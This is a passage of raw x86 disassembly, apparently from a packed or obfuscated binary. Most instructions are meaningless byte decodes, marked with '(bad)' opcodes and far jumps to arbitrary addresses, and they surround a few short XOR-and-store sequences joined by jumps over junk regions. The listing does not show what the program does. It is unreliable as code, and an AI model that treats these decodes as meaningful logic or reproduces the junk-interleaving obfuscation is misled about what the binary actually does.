  401977:	and    edi,DWORD PTR [esi+0x5b]
  40197a:	sti    
  40197b:	clc    
  40197c:	mov    al,ds:0xf1011e07
  401981:	sub    ebp,edx
  401983:	push   ecx
  401984:	dec    ebx
  401985:	mov    ebx,0x8a30231e
  40198a:	jmp    0x6c83:0xf6064970
  401991:	mov    dh,ch
  401993:	jp     0x4019cc
  401995:	test   eax,0x642746a7
  40199a:	stos   DWORD PTR es:[edi],eax
  40199b:	mov    esp,DWORD PTR [eax+0x5d35bf4c]
  4019a1:	scas   eax,DWORD PTR es:[edi]
  4019a2:	xchg   edx,eax
  4019a3:	mov    ah,0x8b
  4019a5:	sub    DWORD PTR [ecx+esi*1+0x697a2dca],eax
  4019ac:	cmp    al,0xd3
  4019ae:	js     0x401a0f
  4019b0:	mov    eax,ds:0x1bf7ffe
  4019b5:	pop    edx
  4019b6:	xchg   DWORD PTR [edx],ebp
  4019b8:	or     ah,BYTE PTR [edi+0x4027d70]
  4019be:	hlt    
  4019bf:	xchg   esp,eax
  4019c0:	xchg   edx,eax
  4019c1:	jge    0x4019cd
  4019c3:	data16 fwait
  4019c5:	push   ss
  4019c6:	push   esp
  4019c7:	aad    0xf3
  4019c9:	cwde   
  4019ca:	push   ebp
  4019cb:	(bad)  [eax-0x6687cdc8]
  4019d1:	xchg   ebx,eax
  4019d2:	cmp    al,0xe
  4019d4:	dec    esp
  4019d5:	bound  edi,QWORD PTR [esi-0x11]
  4019d8:	dec    ebx
  4019d9:	sub    bh,bl
  4019db:	ror    edx,1
  4019dd:	mov    eax,0xec5ea636
  4019e2:	test   BYTE PTR [edx-0x7cb7ec7e],bl
  4019e8:	sbb    edx,DWORD PTR [ecx-0x5a7aa5c9]
  4019ee:	aad    0x46
  4019f0:	fidiv  WORD PTR [ebp-0x4a]
  4019f3:	sahf   
  4019f4:	jecxz  0x4019c6
  4019f6:	in     al,dx
  4019f7:	popf   
  4019f8:	stc    
  4019f9:	mov    ah,0x8e
  4019fb:	xor    al,0x2d
  4019fd:	addr16 clc 
  4019ff:	mov    esi,0xe32a2738
  401a04:	cmp    ebp,edi
  401a06:	mov    al,0x79
  401a08:	mov    dh,0x77
  401a0a:	jno    0x4019b3
  401a0c:	mov    BYTE PTR [eax+0x3e23aa2f],al
  401a12:	sub    ecx,DWORD PTR [ecx+ecx*4-0x38]
  401a16:	pushf  
  401a17:	xor    BYTE PTR [esp+ebx*4-0x98d9a10],bl
  401a1e:	inc    esi
  401a1f:	sbb    al,0x64
  401a21:	call   0x95f2b812
  401a26:	pop    edx
  401a27:	mov    eax,0x919cf149
  401a2c:	push   0x25
  401a2e:	cwde   
  401a2f:	pop    ebx
  401a30:	mov    esp,0x343046e1
  401a35:	and    bh,dl
  401a37:	fimul  WORD PTR [ebp-0x34]
  401a3a:	add    BYTE PTR [edi],ah
  401a3c:	imul   ebp,DWORD PTR [ebp-0x1a],0x53c53c53
  401a43:	in     eax,dx
  401a44:	xlat   BYTE PTR ds:[ebx]
  401a45:	adc    eax,0x81911d0d
  401a4a:	and    DWORD PTR [eax],ebx
  401a4c:	sbb    BYTE PTR [edi-0x4d0da83],al
  401a52:	xchg   ebp,eax
  401a53:	mul    DWORD PTR [ecx]
  401a55:	aas    
  401a56:	push   esi
  401a57:	mov    gs,WORD PTR [esi]
  401a59:	lds    ecx,FWORD PTR [esi]
  401a5b:	xor    eax,0x8de02fba
  401a60:	jmp    0xc238:0x178eab23
  401a67:	inc    eax
  401a68:	push   edi
  401a69:	outs   dx,DWORD PTR ds:[esi]
  401a6a:	sub    dl,cl
  401a6c:	inc    esi
  401a6d:	pop    edx
  401a6e:	mov    eax,ds:0x79088d0b
  401a73:	repz add BYTE PTR [edi-0x4fa276bb],0xe9
  401a7b:	pushf  
  401a7c:	add    DWORD PTR [eax],eax
  401a7e:	add    BYTE PTR [ecx-0x4c264c60],dl
  401a84:	jmp    0x10588ada
  401a89:	push   ds
  401a8a:	dec    esp
  401a8b:	dec    esp
  401a8c:	jns    0x401a5b
  401a8e:	pop    edi
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a99
  401a98:	fcom   DWORD PTR ds:0xc5bce78f
  401a9e:	jns    0x401aff
  401aa0:	pop    ebp
  401aa1:	shl    DWORD PTR [ecx+ebx*1],0xd5
  401aa5:	ja     0x401a94
  401aa7:	cdq    
  401aa8:	add    bl,BYTE PTR [eax-0x137805cb]
  401aae:	add    edx,DWORD PTR [ebp+0x1bed864]
  401ab4:	jno    0x401a77
  401ab6:	jnp    0x401b2f
  401ab8:	push   esi
  401ab9:	sub    al,0x42
  401abb:	pop    edi
  401abc:	inc    edx
  401abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401abe:	(bad)  
  401abf:	jl     0x401b1c
  401ac1:	aam    0x20
  401ac3:	mov    ecx,0xa9dec1b
  401ac8:	call   0x632c4f
  401acd:	cmp    ebp,DWORD PTR [ecx-0x3ec19adb]
  401ad3:	cwde   
  401ad4:	jae    0x401a7a
  401ad6:	or     dl,al
  401ad8:	cs ins DWORD PTR es:[edi],dx
  401ada:	xchg   esi,eax
  401adb:	frstor [edx-0x5333ecd1]
  401ae1:	sbb    al,0x67
  401ae3:	mov    eax,ds:0x6cd151af
  401ae8:	shl    BYTE PTR [bp+di-0x35],cl
  401aec:	lock push ebp
  401aee:	pop    es
  401aef:	mov    DWORD PTR [edi-0x4581adb8],edx
  401af5:	gs sbb bl,cl
  401af8:	dec    esp
  401af9:	cmp    ecx,edx
  401afb:	mov    eax,0xa84eb29f
  401b00:	data16 jp 0x401aaf
  401b03:	out    0xd,eax
  401b05:	xchg   esp,eax
  401b06:	inc    esp
  401b07:	test   BYTE PTR [eax],bh
  401b09:	adc    ch,BYTE PTR [eax-0x8]
  401b0c:	xchg   esi,eax
  401b0d:	ficom  WORD PTR [ecx+0x71]
  401b10:	je     0x401b31
  401b12:	sbb    al,0xa5
  401b14:	xchg   ebx,eax
  401b15:	sub    DWORD PTR [esp+esi*4-0x7c],edx
  401b19:	pop    es
  401b1a:	nop
  401b1b:	lods   al,BYTE PTR ds:[esi]
  401b1c:	add    edi,DWORD PTR [ebp-0x6e]
  401b1f:	arpl   di,bx
  401b21:	pop    ecx
  401b22:	and    DWORD PTR [esi-0x59],esi
  401b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b26:	inc    ebp
  401b27:	into   
  401b28:	call   0xc6cc:0xe378b614
  401b2f:	add    BYTE PTR [edi-0x2a],dl
  401b32:	sbb    ah,BYTE PTR [esi+0x6f]
  401b35:	mov    ch,0xe9
  401b37:	jmp    0x9794:0x65110085
  401b3e:	push   ss
  401b3f:	js     0x401b8e
  401b41:	std    
  401b42:	xchg   esi,eax
  401b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b44:	in     eax,0x19
  401b46:	inc    edx
  401b47:	mov    ebp,0x17e04302
  401b4c:	rol    DWORD PTR [eax+eiz*2+0x22],1
  401b50:	icebp  
  401b51:	jne    0x401b87
  401b53:	jne    0x401bd1
  401b55:	and    ch,BYTE PTR [ebx-0x41]
  401b58:	aaa    
  401b59:	mov    ebx,0x7d0969e
  401b5e:	pop    es
  401b5f:	mov    ds,WORD PTR [edi]
  401b61:	jmp    0x401b37
  401b63:	xchg   ebx,eax
  401b64:	push   cs
  401b65:	(bad)  
  401b66:	xchg   edx,eax
  401b67:	or     eax,0x3f3d3fde
  401b6c:	iret   
  401b6d:	inc    edi
  401b6e:	inc    edi
  401b6f:	dec    ecx
  401b70:	std    
  401b71:	out    0xa6,eax
  401b73:	lods   al,BYTE PTR ds:[esi]
  401b74:	mov    al,0x6
  401b76:	pop    ebx
  401b77:	sub    DWORD PTR [eax-0x726a88e5],0x2abb120c
  401b81:	ja     0x401b46
  401b83:	nop
  401b84:	aaa    
  401b85:	pop    ebx
  401b86:	push   esp
  401b87:	retf   0xd067
  401b8a:	mov    al,0xe4
  401b8c:	jne    0x401b1c
  401b8e:	scas   eax,DWORD PTR es:[edi]
  401b8f:	test   dl,ch
  401b91:	pusha  
  401b92:	aaa    
  401b93:	push   edx
  401b94:	pop    ss
  401b95:	push   ss
  401b96:	push   es
  401b97:	enter  0xd6ec,0xef
  401b9b:	sbb    eax,0x1df06c66
  401ba0:	inc    ecx
  401ba1:	data16 ins BYTE PTR es:[edi],dx
  401ba3:	mov    esi,0xc2a706a1
  401ba8:	jae    0x401bb3
  401baa:	mov    ch,0x1f
  401bac:	aam    0x8e
  401bae:	adc    DWORD PTR [ebx],edi
  401bb0:	mov    edi,0x66f07c5a
  401bb5:	retf   
  401bb6:	push   eax
  401bb7:	or     BYTE PTR [eax],bl
  401bb9:	add    DWORD PTR [ebp+0x1c],ecx
  401bbc:	pusha  
  401bbd:	mov    eax,0xc6cfff1e
  401bc2:	ss out 0x47,al
  401bc5:	and    BYTE PTR [ebx],0xfd
  401bc8:	stos   BYTE PTR es:[edi],al
  401bc9:	push   edi
  401bca:	js     0x401be7
  401bcc:	call   DWORD PTR [esi+0x9]
  401bcf:	dec    ecx
  401bd0:	dec    esp
  401bd1:	popf   
  401bd2:	jge    0x401bd8
  401bd4:	sub    al,0xb2
  401bd6:	pop    esp
  401bd7:	push   0xffffffe4
  401bd9:	stos   DWORD PTR es:[edi],eax
  401bda:	stos   BYTE PTR es:[edi],al
  401bdb:	lea    ebp,[ebp-0x63]
  401bde:	imul   BYTE PTR [ebx-0x2450ef9a]
  401be4:	push   0x56
  401be6:	inc    esi
  401be7:	or     edi,ecx
  401be9:	add    bl,dh
  401beb:	xchg   esi,eax
  401bec:	add    ah,BYTE PTR [ebx-0x7a1be58f]
  401bf2:	or     esi,DWORD PTR [ecx-0x59cab446]
  401bf8:	outs   dx,DWORD PTR ds:[esi]
  401bf9:	je     0x401bb7
  401bfb:	sub    cl,BYTE PTR ds:0xfb2f6f76
  401c01:	std    
  401c02:	mov    esp,0x2be660e7
  401c07:	mov    ch,0xee
  401c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c0a:	mov    dh,0x56
  401c0c:	(bad)  
  401c0d:	dec    edi
  401c0e:	push   edi
  401c0f:	iret   
  401c10:	and    al,0xf4
  401c12:	lea    esi,[ebx+0xf]
  401c15:	not    DWORD PTR [edi]
  401c17:	cmp    esi,edx
  401c19:	fwait
  401c1a:	pop    eax
  401c1b:	mov    eax,DWORD PTR [ebp-0x50]
  401c1e:	mov    ecx,DWORD PTR [ebp-0x8]
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	(bad)  
  401c41:	xchg   BYTE PTR [ebx+0x7e798a57],dl
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401bda
  401c4d:	ret    0xe95c
  401c50:	leave  
  401c51:	add    bh,BYTE PTR [edx+ebx*4]
  401c54:	fld    DWORD PTR [ebx+0x2b6d366e]
  401c5a:	xchg   edi,eax
  401c5b:	cmp    BYTE PTR [eax+0x2b77b5c5],0xa2
  401c62:	jnp    0x401be7
  401c64:	bound  ebx,QWORD PTR [ebx+ecx*1-0x3c]
  401c68:	mov    ds:0x6811212e,al
  401c6d:	dec    esi
  401c6e:	mov    eax,0xae83686d
  401c73:	xor    ebp,DWORD PTR [edi+esi*8+0x4b]
  401c77:	stc    
  401c78:	fistp  WORD PTR [esi-0x7bac2b67]
  401c7e:	jg     0x401cef
  401c80:	inc    edi
  401c81:	or     DWORD PTR [edi+0x71],ebx
  401c84:	test   BYTE PTR [ecx-0x1c],0xa7
  401c88:	xor    al,0x40
  401c8a:	leave  
  401c8b:	or     dh,BYTE PTR [ebx-0x4824847b]
  401c91:	int3   
  401c92:	mov    ebx,0x25a0ad39
  401c97:	jecxz  0x401c66
  401c99:	daa    
  401c9a:	retf   
  401c9b:	xchg   edi,eax
  401c9c:	hlt    
  401c9d:	inc    ebp
  401c9e:	sbb    BYTE PTR [ecx+0x59],al
  401ca1:	iret   
  401ca2:	pop    ebx
  401ca3:	and    al,0xe7
  401ca5:	std    
  401ca6:	mov    bl,0x77
  401ca8:	mov    eax,0x8b58262f
  401cae:	push   ecx
  401caf:	aaa    
  401cb0:	cmc    
  401cb1:	and    ch,bl
  401cb3:	xchg   bl,ch
  401cb5:	jge    0x401cde
  401cb7:	push   edi
  401cb8:	xchg   esi,eax
  401cb9:	mov    esi,0x1fa73403
  401cbe:	fild   QWORD PTR [ebx-0x5c581666]
  401cc4:	adc    DWORD PTR [ebp-0x6fd42447],0x80c56a0d
  401cce:	cmp    al,0x69
  401cd0:	sub    DWORD PTR [ecx-0x73],esi
  401cd3:	gs dec ebx
  401cd5:	cmp    eax,0x151c2db7
  401cda:	jnp    0x401cf0
  401cdc:	sub    ecx,DWORD PTR [ebp+0x13e0377c]
  401ce2:	jmp    0x45403ceb
  401ce7:	push   ss
  401ce8:	mov    cl,0xc8
  401cea:	es out 0xd0,eax
  401ced:	xlat   BYTE PTR ds:[ebx]
  401cee:	and    BYTE PTR [ebp+0x64],dh
  401cf1:	xchg   edx,eax
  401cf2:	inc    esp
  401cf3:	scas   eax,DWORD PTR es:[edi]
  401cf4:	out    0xd6,eax
  401cf6:	or     BYTE PTR [eax-0x69],bh
  401cf9:	cmp    bh,BYTE PTR [ecx+0x72]
  401cfc:	pop    ecx
  401cfd:	popf   
  401cfe:	retf   0x521a
  401d01:	adc    eax,0x6c0071f0
  401d06:	jl     0x401c93
  401d08:	pop    ebx
  401d09:	sbb    eax,ebx
  401d0b:	stos   DWORD PTR es:[edi],eax
  401d0c:	xchg   DWORD PTR [edx+0x38],ebx
  401d0f:	leave  
  401d10:	pop    edi
  401d11:	ret    0x7a5a
  401d14:	fsub   QWORD PTR [esi-0x7274dd87]
  401d1a:	scas   eax,DWORD PTR es:[edi]
  401d1b:	loope  0x401d5c
  401d1d:	inc    edx
  401d1e:	das    
  401d1f:	pop    eax
  401d20:	dec    ebx
  401d21:	mov    ebx,0xb34db88b
  401d26:	pop    eax
  401d27:	mov    WORD PTR [ebx-0x45],fs
  401d2a:	dec    ebx
  401d2b:	into   
  401d2c:	sbb    BYTE PTR [ebx+0x10],dh
  401d2f:	push   0x43
  401d31:	xchg   DWORD PTR [ebp-0x37c8d9c0],edx
  401d37:	mov    ecx,0x1e91d5f8
  401d3c:	cmp    di,si
  401d3f:	hlt    
  401d40:	rcr    ebx,cl
  401d42:	lock xlat BYTE PTR ds:[ebx]
  401d44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d45:	aad    0x19
  401d47:	pop    ecx
  401d48:	adc    ebx,esp
  401d4a:	ja     0x401ce6
  401d4c:	mov    eax,0x8f19a5e
  401d51:	cmp    eax,0xa88272e5
  401d56:	sbb    BYTE PTR [eax],0xb3
  401d59:	sub    eax,0xeda6b6bf
  401d5e:	pop    eax
  401d5f:	popa   
  401d60:	popf   
  401d61:	out    0xc6,eax
  401d63:	xchg   ebp,eax
  401d64:	cmp    DWORD PTR [ebx],esp
  401d66:	clc    
  401d67:	pop    esi
  401d68:	lods   eax,DWORD PTR ds:[esi]
  401d69:	jae    0x401d21
  401d6b:	mov    bh,0x24
  401d6d:	fist   WORD PTR [edi-0x5a27a0a9]
  401d73:	jg     0x401dc2
  401d75:	fsub   st,st(3)
  401d77:	popa   
  401d78:	mov    dh,0x8c
  401d7a:	jmp    0x8863:0xdae58b6a
  401d81:	(bad)
  401d85:	mov    bh,0x42
  401d87:	bound  edi,QWORD PTR [edi-0x6d]
  401d8a:	rol    DWORD PTR [ebx],1
  401d8c:	adc    DWORD PTR [ecx-0x29],esi
  401d8f:	cmp    DWORD PTR [edx-0x7f],ecx
  401d92:	push   ds
  401d93:	pop    ebx
  401d94:	xchg   ecx,eax
  401d95:	push   ds
  401d96:	push   ebx
  401d97:	jo     0x401dfb
  401d99:	pop    esi
  401d9a:	outs   dx,DWORD PTR ds:[esi]
  401d9b:	int3   
  401d9c:	in     eax,dx
  401d9d:	fdivr  st,st(7)
  401d9f:	xor    DWORD PTR [ecx+eiz*1-0x2d],edx
  401da3:	sbb    edx,DWORD PTR [edx-0x33]
  401da6:	cmp    DWORD PTR [ecx+0x4a],0x4c
  401daa:	or     al,0x33
  401dac:	aas    
  401dad:	inc    ebx
  401dae:	mov    ah,0xbe
  401db0:	enter  0xec1d,0x9c
  401db4:	dec    eax
  401db5:	pop    edx
  401db6:	imul   DWORD PTR [edx]
  401db8:	and    DWORD PTR [edi],0xe160b7bc
  401dbe:	aas    
  401dbf:	scas   al,BYTE PTR es:[edi]
  401dc0:	jg     0x401e00
  401dc2:	cwde   
  401dc3:	fidiv  WORD PTR [esi]
  401dc5:	stos   DWORD PTR es:[edi],eax
  401dc6:	mov    dl,0xd4
  401dc8:	lahf   
  401dc9:	inc    edx
  401dca:	das    
  401dcb:	sar    DWORD PTR [ebp+0x28],1
  401dce:	fmul   DWORD PTR [eax+0x3]
  401dd1:	(bad)  
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax-0x551925c8],ebp
  401e0d:	lahf   
  401e0e:	push   ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401e14
  401e17:	cdq    
  401e18:	stos   BYTE PTR es:[edi],al
  401e19:	mov    bh,0x6d
  401e1b:	int3   
  401e1c:	arpl   WORD PTR [ebx-0x31],si
  401e1f:	cmc    
  401e20:	ja     0x401e78
  401e22:	ret    0x6
  401e25:	(bad)  
  401e26:	mov    ebx,DWORD PTR [edx-0x1ca73052]
  401e2c:	dec    edx
  401e2d:	pop    esi
  401e2e:	iret   
  401e2f:	outs   dx,BYTE PTR ds:[esi]
  401e30:	fdivr  DWORD PTR [edx+ebx*8+0x56627d48]
  401e37:	mov    edx,0x266b5364
  401e3c:	test   BYTE PTR [eax+0x7e],dl
  401e3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e40:	and    al,0x2c
  401e42:	stc    
  401e43:	xlat   BYTE PTR ds:[ebx]
  401e44:	and    DWORD PTR [ecx-0x238042cf],ecx
  401e4a:	push   es
  401e4b:	aas    
  401e4c:	jmp    0x107c7ac7
  401e51:	mov    dh,0x34
  401e53:	dec    esp
  401e55:	retf   0x7c2d
  401e58:	gs clc 
  401e5a:	cmp    BYTE PTR [ecx],al
  401e5c:	or     al,0x29
  401e5e:	shl    BYTE PTR [esi],0x23
  401e61:	cmp    al,0x62
  401e63:	pop    es
  401e64:	adc    dl,ah
  401e66:	retf   
  401e67:	stos   DWORD PTR es:[edi],eax
  401e68:	and    ecx,DWORD PTR [esi+ecx*2+0x362a5d2]
  401e6f:	pusha  
  401e70:	mov    eax,ds:0xb542c1ef
  401e75:	xchg   esi,eax
  401e76:	dec    esi
  401e77:	lods   al,BYTE PTR ds:[esi]
  401e78:	pop    ebp
  401e79:	out    dx,eax
  401e7a:	xchg   esp,eax
  401e7b:	aas    
  401e7c:	inc    eax
  401e7d:	call   0xc16c:0x987ce746
  401e84:	(bad)  
  401e85:	mov    es,WORD PTR [edx]
  401e87:	push   eax
  401e88:	loope  0x401ee2
  401e8a:	jns    0x401ea1
  401e8c:	add    DWORD PTR [ebp-0x2c],edi
  401e8f:	add    DWORD PTR [esi+0x6eb0d0b2],ecx
  401e95:	xlat   BYTE PTR ds:[ebx]
  401e96:	cmc    
  401e97:	mov    ds:0x11efe49,al
  401e9c:	mov    eax,0x7bba2f17
  401ea1:	sbb    ah,BYTE PTR [ecx+ebx*1+0x64]
  401ea5:	scas   eax,DWORD PTR es:[edi]
  401ea6:	xchg   ebx,eax
  401ea7:	clc    
  401ea8:	mov    ecx,0x360b3225
  401ead:	and    al,0x12
  401eaf:	loopne 0x401e3a
  401eb1:	sar    DWORD PTR [ebx-0x729e7d76],cl
  401eb7:	out    dx,eax
  401eb8:	add    ecx,esi
  401eba:	or     BYTE PTR [edi+0x34],dh
  401ebd:	jl     0x401eea
  401ebf:	sti    
  401ec0:	shr    dh,1
  401ec2:	test   DWORD PTR [edi+0x20],esp
  401ec5:	in     eax,dx
  401ec6:	push   ss
  401ec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ec8:	(bad)  
  401ec9:	xor    edx,DWORD PTR [ebx-0x29]
  401ecc:	jo     0x401ef4
  401ece:	jp     0x401f04
  401ed0:	mov    dl,0x47
  401ed2:	fdiv   QWORD PTR ss:[eax+esi*8+0x79]
  401ed7:	in     al,dx
  401ed8:	nop
  401ed9:	or     eax,0xa67900c
  401ede:	pop    ebx
  401edf:	out    0xb7,eax
  401ee1:	(bad)  
  401ee3:	int    0x8c
  401ee5:	dec    DWORD PTR ds:0x32a25581
  401eeb:	pop    eax
  401eec:	fisttp QWORD PTR [ebp+0x4a]
  401eef:	lods   al,BYTE PTR ds:[esi]
  401ef0:	lds    ebp,FWORD PTR [edx+edx*1-0xb91b8c]
  401ef7:	mov    dh,BYTE PTR [ecx+eax*1]
  401efa:	(bad)  
  401efb:	add    BYTE PTR [ebx+0x29],0x1c
  401eff:	mul    BYTE PTR [edi+0x4c]
  401f02:	fmul   QWORD PTR [ebx]
  401f04:	inc    edi
  401f05:	shr    DWORD PTR [edi+ebp*4+0x1d],0x4f
  401f0a:	daa    
  401f0b:	jb     0x401eef
  401f0d:	jg     0x401ed0
  401f0f:	int    0x74
  401f11:	mov    ebp,0xc46af560
  401f16:	lods   eax,DWORD PTR ds:[esi]
  401f17:	enter  0xc94f,0xe2
  401f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f1c:	(bad)  
  401f1d:	jmp    0xb1bf923f
  401f22:	xchg   edi,eax
  401f23:	push   ss
  401f24:	pop    edx
  401f25:	xor    edi,DWORD PTR [edi-0x557b4a24]
  401f2b:	pop    ebp
  401f2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f2d:	push   ebp
  401f2e:	pusha  
  401f2f:	push   esp
  401f30:	xor    BYTE PTR [ebx],ah
  401f32:	sub    eax,0x4dffe750
  401f37:	dec    eax
  401f38:	and    BYTE PTR [esi],ah
  401f3a:	inc    esi
  401f3b:	jecxz  0x401f91
  401f3d:	adc    DWORD PTR [edx-0x9e632fb],ebx
  401f43:	sbb    al,0xfb
  401f45:	sar    DWORD PTR [ecx-0x40],1
  401f48:	outs   dx,DWORD PTR ds:[esi]
  401f49:	mov    edi,0x608ccc79
  401f4e:	sahf   
  401f4f:	dec    ebx
  401f50:	sub    bh,BYTE PTR [ebx+0x34b5ea1d]
  401f56:	loop   0x401f42
  401f58:	sbb    eax,0xe4360e77
  401f5d:	pop    edx
  401f5e:	call   0x88330317
  401f63:	int    0x5d
  401f65:	sub    DWORD PTR ds:0x65f7a8e5,edi
  401f6b:	ror    BYTE PTR [edi+ebx*1-0x6b643fba],0x54
  401f73:	push   0x3ba65372
  401f78:	mov    edi,0xe1e660b4
  401f7d:	sahf   
  401f7e:	push   eax
  401f7f:	or     BYTE PTR fs:[ebp-0xbeb0f61],bl
  401f86:	inc    edi
  401f87:	inc    eax
  401f88:	dec    esp
  401f89:	xor    BYTE PTR [ebx+0x5c6b671a],dl
  401f8f:	pop    eax
  401f90:	pushf  
  401f91:	call   0x19397dd8
  401f96:	jmp    0x6d84:0xfe31529
  401f9d:	add    eax,DWORD PTR [eax]
  401f9f:	add    BYTE PTR [ebp-0x977b],cl
  401fa5:	call   DWORD PTR [eax-0x75]
  401fa8:	inc    ebp
  401fa9:	in     al,0x33
  401fab:	mov    BYTE PTR [ebx],0xc7
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xe9579c26
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f6f
  401fcc:	pop    ebp
  401fcd:	loopne 0x401fc2
  401fcf:	mov    ch,0xa9
  401fd1:	in     eax,0x6d
  401fd3:	adc    ebx,DWORD PTR [edi-0x56]
  401fd6:	daa    
  401fd7:	mov    fs,ebp
  401fd9:	test   ebx,eax
  401fdb:	cdq    
  401fdc:	push   ecx
  401fdd:	(bad)  
  401fde:	jmp    0x401f74
  401fe0:	shl    DWORD PTR [ebp-0x5acf1fb6],cl
  401fe6:	sub    DWORD PTR [edx],edi
  401fe8:	in     eax,0xd7
  401fea:	jmp    0xa480:0x4fa41820
  401ff1:	neg    BYTE PTR [edi]
  401ff3:	adc    ecx,DWORD PTR [ecx-0x226674ef]
  401ff9:	(bad)  
  401ffa:	mov    al,0xd2
  401ffc:	pop    ds
  401ffd:	xor    eax,0x9ab1751
  402002:	jmp    0xaa1ad751
  402007:	fld    DWORD PTR [ebx]
  402009:	addr16 push eax
  40200b:	add    esi,DWORD PTR [edi-0x41b42000]
  402011:	dec    esp
  402012:	pop    esp
  402013:	je     0x401fb0
  402015:	ja     0x402037
  402017:	lds    edi,FWORD PTR [eax]
  402019:	lea    edx,[edx-0x1f]
  40201c:	xor    al,0x3a
  40201e:	push   DWORD PTR [ebx+0x2a]
  402021:	inc    ebx
  402022:	jle    0x402014
  402024:	mov    esi,0x3fcdd7e4
  402029:	stc    
  40202a:	push   edi
  40202b:	pusha  
  40202c:	push   cs
  40202d:	(bad)  
  40202e:	int3   
  40202f:	mov    edi,0xa6078419
  402034:	rcl    BYTE PTR [edi],cl
  402036:	add    ecx,DWORD PTR [ecx-0x12]
  402039:	lods   al,BYTE PTR ds:[esi]
  40203a:	icebp  
  40203b:	sub    DWORD PTR [eax+ecx*8+0x78238881],esp
  402042:	cs add ch,bh
  402045:	sbb    al,0xde
  402047:	jl     0x402087
  402049:	and    esp,DWORD PTR [eax]
  40204b:	xor    eax,0x35ddfe38
  402050:	fisubr WORD PTR [ebp+0x15]
  402053:	pop    ds
  402054:	and    BYTE PTR [edi+0x9],dh
  402057:	fsubrp st(3),st
  402059:	pop    esp
  40205a:	pop    esi
  40205b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40205c:	stc    
  40205d:	out    dx,al
  40205e:	leave  
  40205f:	imul   edi,DWORD PTR [edi+edi*1],0xffffffed
  402063:	jne    0x4020ab
  402065:	test   BYTE PTR [edi+0xf6d5d13],ah
  40206b:	mov    esp,DWORD PTR [ebx+0x57]
  40206e:	bound  ebp,QWORD PTR [edx+0x5c087310]
  402074:	push   edx
  402075:	mov    dl,0xd4
  402077:	lods   eax,DWORD PTR ds:[esi]
  402078:	dec    esi
  402079:	mov    dh,0x83
  40207b:	mov    dl,0xb
  40207d:	and    bh,ah
  40207f:	sahf   
  402080:	cmp    dh,BYTE PTR [edx-0x46ebdbe4]
  402086:	(bad)  
  402087:	cmp    dh,BYTE PTR [ebx+0x2e]
  40208a:	aaa    
  40208b:	test   al,0xa3
  40208d:	inc    ebx
  40208e:	cmp    al,0x1
  402090:	shl    edx,cl
  402092:	mov    dh,0xec
  402094:	xchg   edx,eax
  402095:	push   ss
  402096:	mov    dl,0xa9
  402098:	lea    ecx,[ecx]
  40209a:	xor    bh,BYTE PTR [edi+0x3be2e7eb]
  4020a0:	jae    0x40207f
  4020a2:	xor    bl,bh
  4020a4:	lods   eax,DWORD PTR ds:[esi]
  4020a5:	mov    cs,esp
  4020a7:	sbb    BYTE PTR [edi],0x17
  4020aa:	push   esp
  4020ab:	dec    ecx
  4020ac:	dec    bp
  4020ae:	stos   BYTE PTR es:[edi],al
  4020af:	outs   dx,BYTE PTR ds:[esi]
  4020b0:	adc    eax,0x7938faeb
  4020b5:	into   
  4020b6:	sbb    eax,esi
  4020b8:	mov    ds:0x857622bf,al
  4020bd:	jae    0x4020ec
  4020bf:	inc    ax
  4020c1:	iret   
  4020c2:	and    eax,0x1aceb8f2
  4020c7:	and    BYTE PTR [ebx-0x47],bl
  4020ca:	aam    0x7b
  4020cc:	mov    ebx,0x676c9388
  4020d1:	inc    edx
  4020d2:	push   ebp
  4020d3:	jmp    0x4020a9
  4020d5:	leave  
  4020d6:	cmp    dh,BYTE PTR [eax+0x7a]
  4020d9:	(bad)  
  4020db:	js     0x40207a
  4020dd:	jo     0x402144
  4020df:	call   0x36abc838
  4020e4:	cmp    BYTE PTR [esi+0x40],0xe
  4020e8:	xchg   ecx,eax
